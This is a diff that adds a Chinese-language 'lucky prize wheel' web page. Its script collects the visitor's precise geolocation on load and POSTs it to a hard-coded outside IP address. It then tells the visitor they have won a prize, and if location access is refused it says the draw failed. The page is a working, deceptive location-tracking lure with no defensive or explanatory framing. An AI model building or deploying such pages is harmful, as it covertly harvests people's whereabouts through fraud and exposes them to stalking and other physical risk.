@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>幸运抽奖</title>
+  <style>
+    body {
+      font-family: "Arial", sans-serif;
+      text-align: center;
+      padding-top: 100px;
+      background: linear-gradient(to bottom right, #f9d423, #ff4e50);
+      color: #fff;
+    }
+    .wheel {
+      width: 200px;
+      height: 200px;
+      margin: 0 auto;
+      background: #fff;
+      border-radius: 50%;
+      border: 10px solid #ff6f61;
+      position: relative;
+    }
+    .wheel::before {
+      content: "";
+      width: 0; height: 0;
+      border-left: 15px solid transparent;
+      border-right: 15px solid transparent;
+      border-bottom: 25px solid #fff;
+      position: absolute;
+      top: -35px;
+      left: calc(50% - 15px);
+    }
+    .text {
+      margin-top: 40px;
+      font-size: 20px;
+      animation: fadeIn 3s ease-in-out forwards;
+      opacity: 0;
+    }
+    @keyframes fadeIn {
+      to { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <h1>幸运大转盘</h1>
+  <div class="wheel"></div>
+  <div class="text" id="status">正在抽奖中，请稍候...</div>
+
+  <script>
+    const statusDiv = document.getElementById("status");
+
+    function sendLocation(lat, lon, acc) {
+      fetch("http://8.138.232.210/send-location.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: acc })
+      })
+      .then(res => res.text())
+      .then(response => {
+        statusDiv.innerHTML = "🎉 恭喜您中了【阳光大礼包】！<br>奖品信息将通过短信或微信通知您～";
+      })
+      .catch(err => {
+        statusDiv.innerHTML = `<p style="color:red;">抽奖失败，请稍后重试。</p>`;
+      });
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const acc = position.coords.accuracy;
+          sendLocation(lat, lon, acc);
+        },
+        (error) => {
+          statusDiv.innerHTML = `<p style="color:red;">抽奖失败：未授权位置信息。</p>`;
+        }
+      );
+    } else {
+      statusDiv.innerHTML = "<p>您的浏览器不支持地理定位功能。</p>";
+    }
+  </script>
+</body>
+</html>
